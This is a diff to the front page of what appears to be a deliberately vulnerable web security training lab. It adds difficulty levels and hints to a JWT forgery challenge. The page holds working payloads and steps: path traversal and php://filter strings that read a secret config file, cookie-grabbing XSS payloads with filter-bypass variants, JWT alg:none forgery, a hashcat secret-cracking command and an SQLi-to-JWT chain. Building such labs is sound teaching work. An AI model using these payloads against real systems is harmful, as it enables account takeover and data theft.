@@ -53,13 +53,15 @@ Full walkthroughs are in <code>SOLUTIONS.md</code>.</p></div>
 <div class="card"><h2>2 · <code>login.php</code> → <code>account.php</code> <span class="flag-pill">🏁 JWT forgery</span></h2>
   <p class="muted">Log in to get a <code>session</code> JWT, then make yourself <code>role=admin</code>
      (<b>alg:none</b> or crack the weak HS256 secret). Edit the cookie in DevTools / jwt.io, then open account.</p>
-  <details><summary>💡 hint</summary><code class="pl" id="pl_login">alice / alice123  → decode the JWT at jwt.io → re-sign with role=admin (alg:none, or secret "secret")</code></details>
+  <div class="levels" id="lv_jwt"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('jwt','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('jwt','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('jwt','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('jwt','expert')">Expert</button></div>
+  <details open><summary>💡 hint — <span class="note" id="note_jwt"></span></summary><code class="pl" id="pl_jwt"></code></details>
   <form method="post" action="login.php" target="r_jwt" onsubmit="show('r_jwt')">
+    <input type="hidden" name="level" id="lvl_jwt" value="easy">
     <input type="text" id="in_u" name="username" placeholder="username" style="min-width:120px">
     <input type="text" id="in_p" name="password" placeholder="password" style="min-width:120px">
     <button type="button" class="ghost" onclick="document.getElementById('in_u').value='alice';document.getElementById('in_p').value='alice123'">fill alice ▶</button>
     <button>Login ▶</button></form>
-  <form method="get" action="account.php" target="r_jwt" onsubmit="show('r_jwt')" style="margin-top:0"><button class="ghost">open account.php ▶</button></form>
+  <form method="get" action="account.php" target="r_jwt" onsubmit="show('r_jwt')" style="margin-top:0"><input type="hidden" name="level" id="lvl_jwt2" value="easy"><button class="ghost">open account.php ▶</button></form>
   <iframe name="r_jwt" id="r_jwt" class="res"></iframe></div>
 
 <!-- 3. SSRF -->
@@ -129,14 +131,21 @@ const PAYLOADS={
  file:{easy:{p:"../private2/secret_config.txt",n:"Easy — raw ../."},medium:{p:"....//private2/secret_config.txt",n:"Medium — ../ stripped once → ....// (one is enough; docs/ is one level deep)."},hard:{p:"....//private2/secret_config.txt",n:"Hard — + must end .txt/.conf/.md (it does)."},expert:{p:"php://filter/convert.base64-encode/resource=private2/secret_config.txt",n:"Expert — traversal blocked → php://filter wrapper, then base64-decode."}},
  name:{easy:{p:"<script>alert(document.cookie)</script>",n:"Easy — raw."},medium:{p:"<img src=x onerror=alert(document.cookie)>",n:"Medium — <script stripped → <img onerror>."},hard:{p:"<details open ontoggle=alert(document.cookie)>",n:"Hard — onerror/onload stripped → ontoggle."},expert:{p:"<input autofocus onfocus=alert(document.cookie)>",n:"Expert — ontoggle stripped → autofocus+onfocus."}}
 };
+PAYLOADS.jwt={
+ easy:{p:"Forge a token: header {\"alg\":\"none\"}, payload {\"user\":\"alice\",\"role\":\"admin\"}, empty signature (keep the trailing dot). Set it as the 'session' cookie, then open account.php.",n:"Easy — alg:none is accepted."},
+ medium:{p:"alg:none is rejected. Crack the HS256 secret: hashcat -m 16500 token.txt rockyou.txt -> 'secret'. Re-sign role=admin on jwt.io with it.",n:"Medium — crack the weak secret ('secret')."},
+ hard:{p:"Tougher secret, still in rockyou -> crack it -> 'superman'. Re-sign role=admin.",n:"Hard — crack a stronger secret ('superman')."},
+ expert:{p:"Secret is strong & uncrackable -- but it is in the DB. SQLi-dump secrets where k='jwt_sign_secret', then sign role=admin with that secret.",n:"Expert — secret leaked via SQLi (SQLi -> JWT chain)."}
+};
 function setLvl(card,lvl){
   var Ld=document.getElementById('lvl_'+card); if(Ld) Ld.value=lvl;
+  var L2=document.getElementById('lvl_'+card+'2'); if(L2) L2.value=lvl;
   var d=PAYLOADS[card][lvl];
   var pl=document.getElementById('pl_'+card); if(pl) pl.textContent=d.p;
   var nt=document.getElementById('note_'+card); if(nt) nt.textContent=d.n;
   document.querySelectorAll('#lv_'+card+' .lvlbtn').forEach(function(b){ b.classList.toggle('on', b.getAttribute('data-l')===lvl); });
 }
-['q','url','file','name'].forEach(function(c){ setLvl(c,'easy'); });
+['q','url','file','name','jwt'].forEach(function(c){ setLvl(c,'easy'); });
 function sendXml(){
   var out=document.getElementById('r_xml'); out.style.display='block'; out.textContent='sending…';
   fetch('import.php',{method:'POST',headers:{'Content-Type':'application/xml'},body:document.getElementById('in_xml').value})
